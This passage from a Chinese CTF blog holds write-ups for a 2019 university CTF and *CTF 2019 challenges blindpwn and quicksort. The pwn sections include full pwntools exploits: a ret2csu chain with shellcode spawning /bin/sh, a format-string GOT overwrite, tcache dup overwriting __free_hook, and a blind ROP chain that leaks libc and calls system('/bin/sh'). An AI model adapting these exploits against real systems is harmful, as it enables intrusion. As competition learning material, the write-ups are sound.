10h</code>，保存到文件之后，点十六下就能拿到 flag。</p><pre><code>.text:004139DF                 mov     eax, 0Ah.text:004139E4                 mov     ecx, 80020004h.text:004139E9                 mov     [ebp+var_FF0], eax.text:004139EF                 mov     [ebp+var_FE0], eax.text:004139F5                 mov     [ebp+var_FD0], eax.text:004139FB                 mov     eax, [ebp+var_B4C].text:00413A01                 mov     [ebp+var_FE8], ecx.text:00413A07                 mov     [ebp+var_FD8], ecx.text:00413A0D                 mov     [ebp+var_FC8], ecx.text:00413A13                 lea     edx, [ebp+var_1000].text:00413A19                 lea     ecx, [ebp+var_FC0].text:00413A1F                 mov     [ebp+var_FF8], eax.text:00413A25                 mov     [ebp+var_1000], 8.text:00413A2F                 call    ds:__vbaVarDup</code></pre><p>或者在代码段可以看到 <code>mov eax, [ebp+var_B4C]</code>，在那堆字符串里找到对应的 flag：</p><pre><code>.text:004121DD                 mov     edx, offset aFlagIMJessicaB ; &quot;flag{I&#39;m Jessica Banks}&quot;.text:004121E2                 lea     ecx, [ebp+var_B4C].text:004121E8                 call    esi ; __vbaStrCopy</code></pre><p>试了一下把每点一次的次数改大一点，发现不可能点出来。因为次数用的是有符号 int 存的，最大也就 32767，再大就变成负数 -32767 了。</p><h2 id="Message-Digest"><a href="#Message-Digest" class="headerlink" title="Message-Digest"></a>Message-Digest</h2><p><code>upx -d</code> 脱一下壳，gdb 调一下就大概知道是怎么回事了。直接爆破：</p><pre><code class="python">#!/usr/bin/env pythonimport hashliblength = 6for i in range(100000, 1000000):    res = hashlib.md5(str(i) + &#39;re200&#39;).hexdigest().upper()    print res    if res == &#39;6941162AC29D59EBC6C3737D296359B2&#39;:        print i, &#39;Success!&#39;        break</code></pre><h2 id="POKPOK"><a href="#POKPOK" class="headerlink" title="POKPOK"></a>POKPOK</h2><p>网上整一个满级号存档，然后<a href="http://www.pokemon.name/thread-457280-1-1.html" target="_blank" rel="noopener">金手指</a>直接跳到打五大天王，打通后找到 flag。</p><p>或者直接用 <code>Advance Map</code> 查看地图就能找到 flag。</p><h2 id="COFFEE"><a href="#COFFEE" class="headerlink" title="COFFEE"></a>COFFEE</h2><p><code>jadx</code> 反编译一下发现是在 native 层进行了加密。反编译一下资源里的 <code>.so</code> 文件。</p><p>看到 data 段给了一半被加密了的 flag，然后将输入的信息和前 16 位异或之后得到正确的 flag。</p><p>然后中间还有一个对输入的 check，正确的输入经过一个 <code>encrypt</code> 函数加密后得到的内容与 data 段中给出的另一段密文相等。加密函数如下：</p><pre><code class="cpp">int __fastcall encrypt(const unsigned __int8 *key, unsigned __int8 *buf, int num_2){  unsigned int v4; // [sp+Ch] [bp-3Ch]  unsigned int v5; // [sp+10h] [bp-38h]  unsigned int v6; // [sp+14h] [bp-34h]  unsigned int v7; // [sp+18h] [bp-30h]  unsigned int j; // [sp+20h] [bp-28h]  unsigned int i; // [sp+24h] [bp-24h]  int v10; // [sp+28h] [bp-20h]  unsigned int v11; // [sp+2Ch] [bp-1Ch]  unsigned int v12; // [sp+30h] [bp-18h]  v7 = bswap32(*(_DWORD *)key);  v6 = bswap32(*((_DWORD *)key + 1));  v5 = bswap32(*((_DWORD *)key + 2));  v4 = bswap32(*((_DWORD *)key + 3));  for ( i = 0; i &lt; num_2; ++i )  {    v10 = 0;    v12 = bswap32(*(_DWORD *)&amp;buf[8 * i]);    v11 = bswap32(*(_DWORD *)&amp;buf[8 * i + 4]);    for ( j = 0; j &lt;= 0x1F; ++j )    {      v10 -= 0x61C88647;      v12 += (v6 + (v11 &gt;&gt; 5)) ^ (v7 + 16 * v11) ^ (v10 + v11);      v11 += (v4 + (v12 &gt;&gt; 5)) ^ (v5 + 16 * v12) ^ (v10 + v12);    }    buf[8 * i] = HIBYTE(v12);    buf[8 * i + 1] = BYTE2(v12);    buf[8 * i + 2] = BYTE1(v12);    buf[8 * i + 3] = v12;    buf[8 * i + 4] = HIBYTE(v11);    buf[8 * i + 5] = BYTE2(v11);    buf[8 * i + 6] = BYTE1(v11);    buf[8 * i + 7] = v11;  }  return 0;}</code></pre><p>加密函数中，<code>v10</code> 显然是个常数，每一轮的值是固定的，而 <code>v11</code> 和 <code>v12</code> 也只是被之前得到的数值进行了加减操作，显然是可逆的。最需要注意的就是大小端。Solve：</p><pre><code class="python">#!/usr/bin/env pythonenc = [0x3C, 0x26, 0x26, 0x34, 0x2E, 0x0F, 0x31, 0x32, 0x6E, 0x20, 0x73, 0x2B, 0x34, 0x3C, 0x20, 0x4A, 0x20, 0x53, 0x4F, 0x4D, 0x45, 0x20, 0x54, 0x45, 0x41, 0x21, 0x7D]key = [0x00, 0x01, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x00]buf = [0xAB, 0x7D, 0x9A, 0xF9, 0x72, 0x86, 0x55, 0xF6, 0x8F, 0xBC, 0x39, 0x58, 0x28, 0x88, 0xD8, 0x09]flag = &#39;&#39;def pack(array):    if len(array) != 4:        print &#39;[*] Length is not correct!&#39;    else:        res = 0        for i in range(3, -1, -1):            res += array[i]            res = res * 0x100        return res / 0x100def unpack(dword):    res = []    for i in range(4):        t = dword &amp; 0xff        dword &gt;&gt;= 8        res.append(t)    res = res[::-1]    return res#print hex(pack([0x12, 0x34, 0x56, 0x78]))#t = unpack(0x12345678)#print t#for x in t:#    print hex(x)def decrypt(key, buf, num=2):    print &#39;Decryption:&#39;    v7 = pack(key[0:4][::-1])    print hex(v7)    v6 = pack(key[4:8][::-1])    print hex(v6)    v5 = pack(key[8:12][::-1])    print hex(v5)    v4 = pack(key[12:16][::-1])    print hex(v4)    print &#39;encrypt:&#39;,    for x in buf:        print hex(x),    print    res = []    for i in range(2):        v11 = pack(buf[8*(1-i)+4:8*(1-i)+8][::-1])        v12 = pack(buf[8*(1-i):8*(1-i)+4][::-1])        print &#39;v11:&#39;, hex(v11)        print &#39;v12:&#39;, hex(v12)        v10 = 0xc6ef3720        for j in range(0x20):            v11 -= (v4 + (v12 &gt;&gt; 5)) ^ (v5 + 16 * v12) ^ (v10 + v12)            v11 = v11 &amp; 0xFFFFFFFF            v12 -= (v6 + (v11 &gt;&gt; 5)) ^ (v7 + 16 * v11) ^ (v10 + v11)            v12 = v12 &amp; 0xFFFFFFFF            v10 += 0x61C88647            v10 = v10 &amp; 0xFFFFFFFF#            print &#39;Round&#39;, 0x20-j, &#39;v11:&#39;, hex(v11), &#39;v12:&#39;, hex(v12)        print &#39;Origin v11:&#39;, hex(v11)        res.extend(unpack(v11)[::-1])        print &#39;Origin v12:&#39;, hex(v12)        res.extend(unpack(v12)[::-1])    res = res[::-1]    print &#39;plain:&#39;,    for x in res:        print hex(x),    print    return resprint &#39;----------HERE ARE THE RESULT----------&#39;res = decrypt(key, buf)for i in range(16):    flag += chr(enc[i] ^ res[i])for i in range(16, len(enc)):    flag += chr(enc[i])print &#39;flag ==&gt;&#39;, flag</code></pre><p>其实根据 <code>encrypt</code> 函数中 <code>v10</code> 减去的值可以判断出加密算法是 TEA，被魔改成了两轮加密。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h2><p>复制粘贴 flag。</p><h2 id="Differ"><a href="#Differ" class="headerlink" title="Differ"></a>Differ</h2><p>通过判断文件的 md5 值来 diff：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibdiff = []flag = &#39;&#39;for i in range(100, 1000):    name = str(i) + &#39;.txt&#39;    f = open(name, &#39;rb&#39;)    content = f.read()    f.close()    t = hashlib.md5(content).digest().encode(&#39;hex&#39;)    if t in diff:        print name, t, &#39;is in diff&#39;    diff.append(t) # dbfe6da0f40487d84dbc2b139f727a31    if t == &#39;dbfe6da0f40487d84dbc2b139f727a31&#39;:        print name        flag += str(i)print flag</code></pre><h2 id="PACMAN"><a href="#PACMAN" class="headerlink" title="PACMAN"></a>PACMAN</h2><p>反编译一下在 <code>MainLoop</code> 函数里找到 flag：</p><pre><code class="cpp">int MainLoop(){  signed int i; // [rsp+Ch] [rbp-4h]  DrawWindow();  wrefresh(win);  wrefresh(status);  usleep(0xF4240u);  do  {    MovePacman(1000000LL);    DrawWindow();    CheckCollision();    MoveGhosts();    DrawWindow();    CheckCollision();    if ( Points &gt; FreeLife )    {      ++Lives;      FreeLife *= 2;    }    Delay();  }  while ( Food &gt; 0 );  if ( Points &gt; 333 )  {    mytmp = &#39;f21{USJZ&#39;;    qword_205EA8 = &#39;c5ec16fb&#39;;    qword_205EB0 = &#39;}c55fbc9&#39;;    byte_205EB8 = 0;    for ( i = 5; i &lt;= 22; ++i )      --*((_BYTE *)&amp;mytmp + i);    pat = (char *)&amp;mytmp;  }  DrawWindow();  return usleep(0xF4240u);}</code></pre><h2 id="AlphaStop"><a href="#AlphaStop" class="headerlink" title="AlphaStop"></a>AlphaStop</h2><p>模仿棋，破解的方法：</p><p><img src="/pics/2019-ZJGSUCTF/AlphaStop.png" srcset="/img/loading.gif" alt></p><p>Solve：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *# context.log_level = &#39;debug&#39;p = remote(&#39;10.21.13.190&#39;, 2604)ins = [&#39;J11&#39;, &#39;I11&#39;, &#39;I10&#39;, &#39;I9&#39;, &#39;J8&#39;, &#39;K8&#39;, &#39;L9&#39;, &#39;L10&#39;, &#39;L11&#39;, &#39;K12&#39;]for x in ins:    p.sendline(x)for i in range(1, 20):    for j in range(13, 20):        x = chr(ord(&#39;A&#39;) - 1 + j)        x = x + str(i)        p.sendline(x)for i in range(1, 9):    p.sendline(&#39;L&#39; + str(i))for i in range(12, 20):    p.sendline(&#39;L&#39; + str(i))for i in range(1, 8):    p.sendline(&#39;K&#39; + str(i))for i in range(13, 20):    p.sendline(&#39;K&#39; + str(i))for i in range(1, 8):    p.sendline(&#39;J&#39; + str(i))p.sendline(&#39;K9&#39;)p.sendline(&#39;K10&#39;)p.recv()p.interactive()</code></pre><h2 id="Blue-Whale"><a href="#Blue-Whale" class="headerlink" title="Blue_Whale"></a>Blue_Whale</h2><pre><code class="bash">$ docker pull n132/blue_whale:Blue_WhaleBlue_Whale: Pulling from n132/blue_whale7e6591854262: Pull complete089d60cb4e0a: Pull complete9c461696bc09: Pull complete45085432511a: Pull complete8aa06b945196: Pull completeDigest: sha256:8087896e15320744a841504f98936c90d29fbdb590a4940fdd0708a053570cabStatus: Downloaded newer image for n132/blue_whale:Blue_Whale$ docker run -it n132/blue_whale:Blue_Whale /bin/bashroot@46298885a759:/# find / -name &quot;fl4g&quot;/lib/x86_64-linux-gnu/fl4groot@46298885a759:/# cat /lib/x86_64-linux-gnu/fl4gZJGSUCTF{0fbaed8d210a7a0480220a5c803d8435}</code></pre><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Mos"><a href="#Mos" class="headerlink" title="Mos"></a>Mos</h2><pre><code class="shell">root@ed82d9634ea6:~/tmp# checksec ./main[*] &#39;/root/tmp/main&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segmentsroot@ed82d9634ea6:~/tmp# ./main123Magic Adress ===&gt;&gt;&gt;0x7ffd7ac7ab60</code></pre><p>障眼法，Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;sp&#39;, &#39;-h&#39;]context.arch = &#39;amd64&#39;local = 0if local:    p = process(&#39;./main&#39;)else:    p = remote(&#39;10.21.13.190&#39;, 2600)# gdb.attach(p)main = 0x400566csu_end_addr = 0x40060acsu_front_addr = 0x4005f0buf = 0x00601000 + 0x100offset = 24payload = &#39;A&#39; * offset + p64(csu_end_addr) + p64(0) + p64(1) + p64(read_got) + p64(0x400) + p64(buf) + p64(0) + p64(csu_front_addr) + &#39;\x00&#39; * 56 + p64(buf)p.send(payload)payload = asm(&#39;&#39;&#39;    mov rax, 59    mov rsi, 0    mov rdx, 0    mov rdi, 0x68732f6e69622f    push rdi    mov rdi, rsp    syscall&#39;&#39;&#39;)p.send(payload)p.interactive()</code></pre><h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><p>格式化字符串，长度受到时间的限制，改 <a href="mailto:system@got.plt" target="_blank" rel="noopener">system@got.plt</a> 的后两个字节为 one_gadget：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *#context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./time&#39;)elf = ELF(&#39;./time&#39;)one_gadgets = [0x45216, 0x4526a]info(one_gadgets)gdb.attach(p)p.recvuntil(&#39;went by....\n&#39;)payload = &#39;%{}c%8$hn&#39;.format(one_gadgets[1] &amp; 0xffff).ljust(0x10, &#39;\x00&#39;) + p64(elf.got[&#39;system&#39;])p.sendline(payload)p.interactive()</code></pre><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>填满 tcache 后用 unsortedbin 泄漏 libc，然后用 tcache dup 把 <code>__free_hook</code> 改成 <code>system</code>。Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;sp&#39;, &#39;-h&#39;]local = 0if local:    p = process(&#39;./note&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;10.21.13.190&#39;, 2599)    libc = ELF(&#39;./libc-2.27.so&#39;)one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]# gdb.attach(p)def cmd(c):    p.recvuntil(&#39;========\n\n&#39;)    p.sendline(str(c))def add(content):    cmd(1)    p.recvuntil(&#39;Note&gt;\n&#39;)    p.send(content)def delete(idx):    cmd(2)    p.recvuntil(&#39;&gt;&#39;)    p.sendline(str(idx))def show(idx):    cmd(3)    p.recvuntil(&#39;&gt;&#39;)    p.sendline(str(idx))add(&#39;A&#39;) # 0add(&#39;B&#39;) # 1add(&#39;A&#39;) # 2add(&#39;A&#39;) # 3add(&#39;A&#39;) # 4add(&#39;A&#39;) # 5add(&#39;A&#39;) # 6add(&#39;A&#39;) # 7add(&#39;A&#39;) # 8delete(2)delete(3)delete(4)delete(5)delete(6)delete(7)delete(8)delete(0)show(0)offset = 0x7f6d1974dca0-0x7f6d19362000libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - offsetsuccess(&#39;libc_base = &#39; + hex(libc_base))one_gadget = libc_base + one_gadget[2]success(&#39;one_gadget = &#39; + hex(one_gadget))add(&#39;A&#39;) # 0add(&#39;A&#39;) # 2add(&#39;A&#39;) # 3add(&#39;A&#39;) # 4add(&#39;A&#39;) # 5add(&#39;A&#39;) # 6add(&#39;A&#39;) # 7add(&#39;A&#39;) # 8delete(8)delete(8)free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]add(p64(free_hook)) # 8add(&#39;A&#39;) # 9system = libc_base + libc.symbols[&#39;system&#39;]success(&#39;system = &#39; + hex(system))add(p64(system)) # 10# gdb.attach(p)add(&#39;/bin/sh&#39;) # 11delete(20)p.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019-Starctf-blindpwn</title>
    <link href="/2019/05/01/2019-Starctf-blindpwn/"/>
    <url>/2019/05/01/2019-Starctf-blindpwn/</url>
    
    <content type="html"><![CDATA[<p>第一次盲打 pwn。</p><a id="more"></a><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><pre><code>Close your eyes!$ nc 34.92.37.22 10000checksec:Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)file libc:libc-2.23.so: ELF 64-bit LSB shared object,x86-64, version 1 (GNU/Linux), dynamicallylinked, interpreter /lib64/ld-linux-x86-64.so.2,BuildID[sha1]=b5381a457906d279073822a5ceb2</code></pre><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>试了一下格式化字符串无果，猜测是栈溢出。尝试爆破溢出的长度，检测脚本：</p><pre><code class="python">def find_offset():    for i in range(1, 500):        try:            p = remote(&#39;34.92.37.22&#39;, 10000)            p.sendafter(&#39;!\n&#39;, &#39;A&#39; * i)            p.recv()            p.close()        except EOFError:            success(&#39;Founded! offset = &#39; + hex(i - 1))            break</code></pre><p>判断出溢出的偏移之后，接下来就是要找 gadget。先尝试自己编译一个类似的程序（<code>gcc test.c -o test -fno-stack-protector</code>）：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void vul() {    char buf[0x20];    puts(&quot;Welcome!&quot;);    read(0, buf, 0x100);    puts(&quot;Goodbye!&quot;);}int main() {    setvbuf(stdin, 0, 2, 0);    setvbuf(stdout, 0, 2, 0);    vul();}</code></pre><p>用 <code>objdump</code> 看反汇编基本可以知道 <code>.text</code> 段是从 <code>0x400500</code> 开始，到将近 <code>0x400800</code> 结束。我们要的通用 gadget 在 <code>__libc_csu_init</code> 中，就直接尝试从 <code>0x400600</code> 开始爆破：</p><pre><code class="python">def get_stop_gadget(offset):    stop_gadget = 0x400000 + 0x600    stop_gadget_list = []    while True:        if stop_gadget &gt; 0x400800:            return stop_gadget_list        try:            p = remote(&#39;34.92.37.22&#39;, 10000)            payload = &#39;A&#39; * offset + p64(stop_gadget)            p.sendafter(&#39;pwn!\n&#39;, payload)            p.recv()            p.close()            success(&#39;Founded! stop_gadget = &#39; + hex(stop_gadget))            stop_gadget_list.append(stop_gadget)            stop_gadget = stop_gadget + 1        except Exception:            stop_gadget = stop_gadget + 1            p.close()# [0x4006ce, 0x4006cf, 0x4006dd, 0x4006e2, 0x4006e7, 0x4006ec, 0x4006f1, 0x4006f6, 0x400705, 0x40070a, 0x40070f, 0x400714, 0x400776]</code></pre><p>拿到了一堆地址，跟据返回地址可以判断第一个肯定是函数开始的地址。后面的应该都是函数中的地址。在一个地址可以看到很多奇怪的输出：</p><pre><code>[DEBUG] Received 0x1b bytes:    &#39;Welcome to this blind pwn!\n&#39;[DEBUG] Sent 0x30 bytes:    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│    *    00000020  41 41 41 41  41 41 41 41  ec 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│    00000030[*] Switching to interactive mode[DEBUG] Received 0x100 bytes:    00000000  57 65 6c 63  6f 6d 65 20  74 6f 20 74  68 69 73 20  │Welc│ome │to t│his │    00000010  62 6c 69 6e  64 20 70 77  6e 21 0a 00  47 6f 6f 64  │blin│d pw│n!··│Good│    00000020  62 79 65 21  0a 00 00 00  01 1b 03 3b  40 00 00 00  │bye!│····│···;│@···│    00000030  07 00 00 00  44 fd ff ff  8c 00 00 00  a4 fd ff ff  │····│D···│····│····│    00000040  5c 00 00 00  9a fe ff ff  b4 00 00 00  bf fe ff ff  │\···│····│····│····│    00000050  d4 00 00 00  02 ff ff ff  f4 00 00 00  54 ff ff ff  │····│····│····│T···│    00000060  14 01 00 00  c4 ff ff ff  5c 01 00 00  14 00 00 00  │····│····│\···│····│    00000070  00 00 00 00  01 7a 52 00  01 78 10 01  1b 0c 07 08  │····│·zR·│·x··│····│    00000080  90 01 07 10  14 00 00 00  1c 00 00 00  40 fd ff ff  │····│····│····│@···│    00000090  2a 00 00 00  00 00 00 00  00 00 00 00  14 00 00 00  │*···│····│····│····│    000000a0  00 00 00 00  01 7a 52 00  01 78 10 01  1b 0c 07 08  │····│·zR·│·x··│····│    000000b0  90 01 00 00  24 00 00 00  1c 00 00 00  b0 fc ff ff  │····│$···│····│····│    000000c0  50 00 00 00  00 0e 10 46  0e 18 4a 0f  0b 77 08 80  │P···│···F│··J·│·w··│    000000d0  00 3f 1a 3b  2a 33 24 22  00 00 00 00  1c 00 00 00  │·?·;│*3$&quot;│····│····│    000000e0  44 00 00 00  de fd ff ff  25 00 00 00  00 41 0e 10  │D···│····│%···│·A··│    000000f0  86 02 43 0d  06 60 0c 07  08 00 00 00  1c 00 00 00  │··C·│·`··│····│····│    00000100Welcome to this blind pwn!\x00Goodbye!\x00\x00\x00\x1b\x03;@\x00\x00\x00\x07\x00\x00\x00D????\x00\xa4???\\x00\x9a\xfe\xff\xff\xb4\x00\x00\x00\xbf\xfe\xff\xff?\x00\x00\xff\xff\xff?T\xff\xff\xff\x14\x00\x00??\xff\xff\\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00zR\x00x\x10\x1b\x0c\x0\x90\x07\x10\x14\x00\x00\x00\x1c\x00\x00\x00@???*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00zR\x00x\x10\x1b\x0c\x0\x90\x00\x00$\x00\x00\x00\x1c\x00\x00\x00\xb0???P\x00\x00\x0e\x10F\x0e\x18J\x0f\x0b\x80\x00?\x1a;*3$&quot;\x00\x00\x00\x00\x1c\x00\x00\x00D\x00\x00\x00??\xff\xff%\x00\x00\x00\x00A\x0e\x10\x86C\x06`\x0c\x0\x00\x00\x00\x1c\x00\x00\x00$</code></pre><p>发生了这种情况，基本可以排除输出函数是 <code>puts</code> 还有 <code>printf</code> 的可能了，因为只有可能是 <code>write</code> 在参数发生错误的时候会输出不一样长度的内容（后来出题人说是因为忘记清空寄存器了）。这里也出现了一个非预期解，因为这个地方直接泄漏了 libc 上的值。放一下 exp：</p><pre><code class="python">p = remote(&#39;34.92.37.22&#39;, 10000)payload = &#39;A&#39; * offset + p64(stop_gadget_list[7])p.recvuntil(&#39;!\n&#39;)p.sendline(payload)libc_start_main = u64(p.recv()[0x48:0x48+8].ljust(8, &#39;\x00&#39;)) - 240success(&#39;libc_start_main = &#39; + hex(libc_start_main))libc_base = libc_start_main - 0x20740success(&#39;libc_base = &#39; + hex(libc_base))one_gadget_offset = [0x45216, 0x4526a, 0xf02a4, 0xf1147]one_gadget = libc_base + one_gadget_offset[0]success(&#39;one_gadget = &#39; + hex(one_gadget))payload = &#39;A&#39; * offset + p64(one_gadget)p.sendline(payload)p.interactive()</code></pre><p>下面还是记录一般 brop 中 dump 内存的方法。</p><p>基本判断出是 <code>write</code> 了之后，可以再定位一下 <code>call write</code> 的地址，手工枚举一下附近的几个地址：</p><pre><code class="shell">$ python -c &quot;import sys; sys.stdout.write(&#39;a&#39;*0x28+&#39;\x14\x07\x40&#39;)&quot; | nc 34.92.37.22 10000 #   #    ####    #####  ######  # #    #    #     #    #### ###  #          #    #####  # #    #          #    # #   #   #    #     #    #          ####      #    #Welcome to this blind pwn!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@F1? @0?;?F1????;?@|??V??p@F1?|??Z???}|???^}(F1?h??;?ۇ?;?p@F1?%</code></pre><p>看到直接把我们输入的字符串以及后面的一些东西输出来了，那说明没有传参直接 call 了 <code>write</code>。</p><p>接下来我们最需要的是在 <code>__libc_csu_init</code> 中的 gadgets，想办法爆破出这个地址：</p><pre><code class="python">def get_brop_gadget(offset, stop_gadget):    brop_gadget = 0x400600    brop_gadget_list = []    while True:        if brop_gadget &gt; 0x400800:            return brop_gadget_list        p = remote(&#39;34.92.37.22&#39;, 10000)        payload = &#39;A&#39; * offset + p64(brop_gadget) + p64(0) * 6 + p64(stop_gadget)        p.sendafter(&#39;pwn!\n&#39;, payload)        try:            p.recvuntil(&#39;pwn!\n&#39;)        except:            p.close()        else:            success(&#39;Founded!&#39; + hex(brop_gadget))            brop_gadget_list.append(brop_gadget)            p.close()        brop_gadget = brop_gadget + 1# [0x4006ce, 0x4006cf, 0x4006dd, 0x4006e2, 0x4006e7, 0x4006ec, 0x400776]</code></pre><p>最后一个地址显然和之前不一样，可以判断出是 <code>__libc_csu_init</code> 上的 gadgets。然后根据偏移可以得到几条关键指令的地址，也就得到了我们的通用 gadgets：</p><pre><code>.text:0000000000400700                 mov     rdx, r13.text:0000000000400703                 mov     rsi, r14.text:0000000000400706                 mov     edi, r15d.text:0000000000400709                 call    qword ptr [r12+rbx*8].text:000000000040070D                 add     rbx, 1.text:0000000000400711                 cmp     rbx, rbp.text:0000000000400714                 jnz     short loc_400700.text:0000000000400716.text:0000000000400716 loc_400716:                             ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400716                 add     rsp, 8.text:000000000040071A                 pop     rbx.text:000000000040071B                 pop     rbp.text:000000000040071C                 pop     r12.text:000000000040071E                 pop     r13.text:0000000000400720                 pop     r14.text:0000000000400722                 pop     r15.text:0000000000400724                 retn</code></pre><p>拿到了通用 gadget，同时利用前面得到的 <code>call write</code>，我们可以把整个 binary 直接 dump 下来：</p><pre><code class="python">def leak(start, length):    elf = &#39;&#39;    for i in range((length + 0xff) / 0x100):        p = remote(&#39;34.92.37.22&#39;, 10000)        payload = (&#39;A&#39; * offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(start + i * 0x100) + p64(0) + p64(call_write)).ljust(0x80, &#39;A&#39;)        print repr(payload)        print len(payload)        p.sendafter(&#39;pwn!\n&#39;, payload)        elf += p.recv(0x100)        p.close()    return elf</code></pre><p>拿到程序之后，在 ida 里可以查到 <code>write</code> 的 <code>plt</code> 和 <code>got</code>，接下来就是泄漏然后 <code>get shell</code> 了。：</p><pre><code>LOAD:0000000000400520 sub_400520      proc near               ; CODE XREF: sub_4006CE+28↓pLOAD:0000000000400520                                         ; sub_4006CE+46↓pLOAD:0000000000400520                 jmp     cs:qword_601018LOAD:0000000000400520 sub_400520      endp</code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="python"># start attackp = remote(&#39;34.92.37.22&#39;, 10000)write_plt = 0x400520write_got = 0x601018payload = &#39;A&#39; * offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main)p.sendafter(&#39;pwn!\n&#39;, payload)write = u64(p.recvuntil(&#39;\x7f&#39;).ljust(8, &#39;\x00&#39;))success(&#39;write = &#39; + hex(write))libc_base = write - 0x0f72b0success(&#39;libc_base = &#39; + hex(libc_base))# get shellsystem = libc_base + 0x045390str_bin_sh = libc_base + 0x18cd57payload = &#39;A&#39; * offset + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)p.sendafter(&#39;pwn!\n&#39;, payload)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#_12" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#_12</a><br><a href="https://n132.github.io/2019/04/29/2019-04-29-Starctf2019-Blindpwn/" target="_blank" rel="noopener">https://n132.github.io/2019/04/29/2019-04-29-Starctf2019-Blindpwn/</a><br><a href="http://shift-crops.hatenablog.com/entry/2019/04/30/131154#blindpwn-Pwn-303pt-47-solves" target="_blank" rel="noopener">http://shift-crops.hatenablog.com/entry/2019/04/30/131154#blindpwn-Pwn-303pt-47-solves</a><br><a href="https://balsn.tw/ctf_writeup/20190427-*ctf/#blindpwn" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190427-*ctf/#blindpwn</a><br><a href="https://github.com/sixstars/starctf2019/blob/master/pwn-blindpwn" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/blob/master/pwn-blindpwn</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019-Starctf-quicksort</title>
    <link href="/2019/04/29/2019-Starctf-quicksort/"/>
    <url>/2019/04/29/2019-Starctf-quicksort/</url>
    
    <content type="html"><![CDATA[<p>略有点脑洞的 Got hijack。</p><a id="more"></a><p>记录一下国际大赛上做出的第一道 pwn 题。</p><h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><pre><code class="bash">root@aa922ef5677a:~/tmp# checksec ./quicksort[*] &#39;/root/tmp/quicksort&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><pre><code class="cpp">unsigned int func(){  char *num; // ebx  char s; // [esp+Ch] [ebp-2Ch]  char v3; // [esp+Dh] [ebp-2Bh]  char v4; // [esp+Eh] [ebp-2Ah]  char v5; // [esp+Fh] [ebp-29h]  char v6; // [esp+10h] [ebp-28h]  char v7; // [esp+11h] [ebp-27h]  char v8; // [esp+12h] [ebp-26h]  char v9; // [esp+13h] [ebp-25h]  char v10; // [esp+14h] [ebp-24h]  char v11; // [esp+15h] [ebp-23h]  char v12; // [esp+16h] [ebp-22h]  char v13; // [esp+17h] [ebp-21h]  char v14; // [esp+18h] [ebp-20h]  char v15; // [esp+19h] [ebp-1Fh]  char v16; // [esp+1Ah] [ebp-1Eh]  char v17; // [esp+1Bh] [ebp-1Dh]  int sum; // [esp+1Ch] [ebp-1Ch]  int i; // [esp+20h] [ebp-18h]  int j; // [esp+24h] [ebp-14h]  char *ptr; // [esp+28h] [ebp-10h]  unsigned int v22; // [esp+2Ch] [ebp-Ch]  v22 = __readgsdword(0x14u);  v3 = 0;  v4 = 0;  v5 = 0;  v6 = 0;  v7 = 0;  v8 = 0;  v9 = 0;  v10 = 